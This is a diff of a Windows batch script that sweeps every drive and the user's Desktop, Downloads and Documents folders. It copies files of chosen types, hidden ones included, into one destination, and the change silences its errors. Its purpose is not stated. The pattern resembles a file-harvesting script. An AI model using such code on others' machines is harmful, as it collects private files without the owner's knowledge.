@@ -25,7 +25,7 @@ for /f %%D in ('wmic logicaldisk get caption ^| findstr /r "[A-Z]:"') do (
         REM Search for files with specified extensions on the drive and copy them to the destination folder
         for %%E in (%extensions%) do (
             REM Search for files recursively and copy them to the destination folder
-            xcopy "%%D\*%%~nxE" "%destination%" /s /i /y /h
+            xcopy "%%D\*%%~nxE" "%destination%" /s /i /y /h 2>nul
         )
     )
 )
@@ -33,7 +33,8 @@ for /f %%D in ('wmic logicaldisk get caption ^| findstr /r "[A-Z]:"') do (
 
 for %%F in ("Desktop" "Downloads" "Documents") do (
     for %%E in (%extensions%) do (
-        xcopy "%USERPROFILE%\%%F\*%%~nxE" "%destination%\%%F\" /s /i /y /h
+        echo copying from %%F
+        xcopy "%USERPROFILE%\%%F\*%%~nxE" "%destination%\%%F\" /s /i /y /h 2>nul
     )
 )
 
